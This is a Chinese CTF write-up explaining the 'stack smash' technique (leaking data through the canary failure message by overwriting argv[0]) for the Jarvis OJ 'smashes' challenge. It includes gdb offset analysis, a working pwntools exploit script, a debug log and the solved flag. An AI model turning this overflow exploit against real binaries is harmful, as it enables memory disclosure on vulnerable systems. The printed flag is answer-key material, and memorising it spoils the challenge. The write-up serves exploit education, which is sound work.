> 参考资料：[https://xz.aliyun.com/t/4657#toc-2](https://xz.aliyun.com/t/4657#toc-2)
>
> [https://blog.csdn.net/qq_41202237/article/details/107628831](https://blog.csdn.net/qq_41202237/article/details/107628831)
>
> 题目环境：**nc pwn.jarvisoj.com 9877**
>
> 附件：
>
> 链接：[https://pan.baidu.com/s/1KnFHzFpMXFKOmBFgsxwB7g](https://pan.baidu.com/s/1KnFHzFpMXFKOmBFgsxwB7g)
>
> 提取码：3gc9
>

# 原理
Stack smash简单点来说就是绕过Canary保护的技术。在程序加载了canary保护之后，如果我们通过栈溢出在覆盖缓冲区的时候就会连带着覆盖了canary保护的Cookie，**<font style="color:#F5222D;">这个时候程序就会报错。但是这个技术并不在乎是否报错，而是在乎报错的内容。stack smash技巧就是利用打印这一信息的程序来得到我们想要的内容。</font>**这是因为在程序启动canary保护之后，如果发现canary被修改的话就会执__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下这个指针指向程序名。代码如下：

```c
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

所以如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串地址，那么在__fortify_fail函数中就会输出我们想要的信息。

简单的来说，就是利用程序的栈溢出来打印flag，比如说：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597912962385-fff970bf-f4bc-476e-a8e9-5e76add92b94.png)

> 红箭头所指向的地方就是argv[0]指针所指向的字符串
>

# 示例
### 基本思路
将文件下载下来，看一下程序的运行流程：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597911081390-b9b95ccb-6f6d-4e49-9c78-bbec7a6ec58b.png)

再看以下文件的保护情况：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597911616203-78fab38c-74b7-42e7-9b40-ef17698498bd.png)

程序开启了NX（栈上不可执行）和Canary保护。

> 请注意这个Canary保护，待会我们通过它得到flag
>

将文件扔到IDA中，看sub_4007E0的伪代码：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597911131294-96b2dd58-34ca-4724-8ba1-7c7a2a888694.png)

程序提供了两次输入：!_IO_gets(&v3)和_IO_getc(stdin);；这两次输入都存在这栈溢出漏洞。

顺带提一下第二次的输入：我们将内容输入到stdio中，最后赋值给了byte_600D20

再看以下memset函数：  memset((void *)((signed int)v0 + 0x600D20LL), 0, (unsigned int)(32 - v0));

> memset函数的原型为：
>
> void * memset( void * ptr, int value, size_t num );
>
> 参数说明：
>
> ptr 为要操作的内存的指针。
>
> value 为要设置的值。你既可以向 value 传递 int 类型的值，也可以传递 char 类型的值，int 和 char 可以根据 ASCII 码相互转换。
>
> num 为 ptr 的前 num 个字节，size_t 就是unsigned int。
>

因此这个函数的意思是从v1 + 0x600D20LL这个地址往后32 - v1字节的内容都以0替代。

我们再看一下的byte_600D20内容：PCTF{Here's the flag on server}

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597911492293-957b767a-ca64-4c99-928b-6d2994aa0ba2.png)

这个flag提示我们真正的flag在服务器上，因此这道题并不是让我们getshell，而是通过栈溢出打印出远程服务器上真正的flag。

那么这时候问题就来了，程序会要求我们输入内容，但是输入的内容总会覆盖真正的flag（byte_600D20），那现在应该怎么办呢？

这时候我们就需要利用“<font style="color:#555555;">ELF重映射”</font>特点：

**<font style="color:#F5222D;">在 ELF 内存映射时，bss 段会被映射两次，所以我们可以使用另一处的地址来进行输出</font>**

> **<font style="color:#F5222D;">当可执行文件足够小的时候，他的不同区段可能会被多次映射。</font>**
>

> **<font style="color:#F5222D;">注：flag字符串存在于data段，但是</font>****<font style="color:#F5222D;">bss段会被映射两次，这里不理解，存疑...</font>**
>

这句话是什么意思呢？我们可以打开gdb来看一下，首先在main函数（0x4006D0）下断点（这里下任意断点就行），然后运行程序：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597913337582-56cdde06-cd5c-47e0-bbe8-969e69b8aed7.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597913371254-42c6a0b4-27e8-45c4-8517-8d27d3d53730.png)

输入“vmmap”查看程序的内存映射：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597913456255-fa83d318-d210-4365-803a-bb1321294158.png)

请注意上图开头的

```c
0x400000           0x401000 r-xp     1000 0      /home/ubuntu/Desktop/smashes
0x600000           0x601000 rw-p     1000 0      /home/ubuntu/Desktop/smashes
```

在调试的时候可以看到smashes被映射到两处地址中，所以只要在二进制文件（offset）0x000000000 ~ 0x00001000范围内的内容都会被映射到内存中，分别以0x600000和0x400000作为起始地址。flag在0x00000d20，所以会在内存中出现两次，分别位于0x00600d20和0x00400d20。所以虽然0x00600d20位置的flag被覆盖了，但是依然可以在0x00400d20找到flag（相当于flag的备份）。

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597913786296-3a7f4d97-4361-4a9b-bf20-6fafd9c285ca.png)

我们知道了flag在内存中存放的位置，接下来就要让程序打印出来它

### 寻找argv[0]指针位置
接下来寻找一下argv[0]所在的位置，argv[0]会有一个明显的特征，就是他会指向程序名，所以我们可以使用gdb在main函数处下断点来寻找：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597915252183-e506f7d3-11af-48a5-bb6e-87d7b91afdf5.png)

可以看到在0x7fffffffe2d4中存放着程序名称，但是这个地址被存放在0x7fffffffdf68处，所以只要把0x7fffffffdf68中的内容替换成flag就可以了。

当然也可以在gdb中使用命令“p & __libc_argv[0]”就可以得到argv[0]的地址

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597915426801-2ad67205-3fc0-417e-bf4c-cec5eaf1b261.png)

### 寻找输入时的栈顶位置
为什么这一步要找输入时的栈顶位置呢？往下看就知道了。

首先我们先看一下gets函数调用的位置，在IDA中查看：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597915877949-0f470ef6-2bb3-43eb-8dbc-9edd9c6d2e9a.png)

从汇编中可以看出在call gets之前，程序将参数放在了rdi中，由于有mov rdi, rsp的存在，因此gets的参数一开始是放在栈里的。继续gdb调试，在gets（0x40080E）下断点，查看栈的内容，如下图所示：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1597916401866-17461c47-1ad9-43e9-b8da-d1712ba76814.png)

可以看到当前的rdi寄存器中的值为rsp寄存器的内容，因为在64位程序中rdi寄存器中存放的是当前执行函数的一参，所以当前的栈顶就是gets函数的一参。所以当前栈顶的位置到刚才的argv[0]的偏移距离就是我们的溢出长度，所以我们通过计算0x7fffffffdf68-0x7fffffffdd50=0x218

也就是说我们输入内容要在0x218以后才能把argv[0]给覆盖掉，并且输入0x218个内容之后把0x00400d20（flag地址）写上就可以了。

exp如下：

```c
#coding=utf8
from pwn import *
context.log_level = 'debug'
p = remote('pwn.jarvisoj.com',9877)
#p=process('./smashes')

payload='a'*0x218+p64(0x400d20)
p.sendlineafter('name? ',payload)
p.sendlineafter('flag: ','Cyberangel')#第二次的gets输入任意内容即可
print p.recv()
```

```powershell
ubuntu@ubuntu:~/Desktop$ python 1.py
[+] Opening connection to pwn.jarvisoj.com on port 9877: Done
[DEBUG] Received 0x19 bytes:
    'Hello!\n'
    "What's your name? "
[DEBUG] Sent 0x221 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000210  61 61 61 61  61 61 61 61  20 0d 40 00  00 00 00 00  │aaaa│aaaa│ ·@·│····│
    00000220  0a                                                  │·│
    00000221
[DEBUG] Received 0x24a bytes:
    'Nice to meet you, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \r'
    '@.\n'
    'Please overwrite the flag: '
[DEBUG] Sent 0xb bytes:
    'Cyberangel\n'
[DEBUG] Received 0x5c bytes:
    'Thank you, bye!\n'
    '*** stack smashing detected ***: PCTF{57dErr_Smasher_good_work!} terminated\n'
Thank you, bye!
*** stack smashing detected ***: PCTF{57dErr_Smasher_good_work!} terminated

[*] Closed connection to pwn.jarvisoj.com port 9877
ubuntu@ubuntu:~/Desktop$ 
```

flag：PCTF{57dErr_Smasher_good_work!}

